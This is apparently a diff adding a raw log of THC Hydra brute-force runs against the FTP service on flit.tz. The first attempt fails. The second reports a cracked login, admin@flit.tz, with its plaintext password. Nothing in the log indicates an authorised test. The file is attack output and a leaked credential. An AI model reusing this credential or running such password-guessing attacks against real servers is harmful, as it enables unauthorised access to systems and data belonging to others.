@@ -1,0 +1,19 @@
+flit.tz -> protected
+Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-13 02:24:38
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
+[DATA] attacking ftp://flit.tz:21/
+0 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-13 02:24:38
+flit.tz -> resolution_failed
+flit.tz -> resolution_failed
+flit.tz -> protected
+Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-13 02:26:37
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
+[DATA] attacking ftp://flit.tz:21/
+[21][ftp] host: flit.tz   login: admin@flit.tz   password: flitadmin2023
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-13 02:27:14
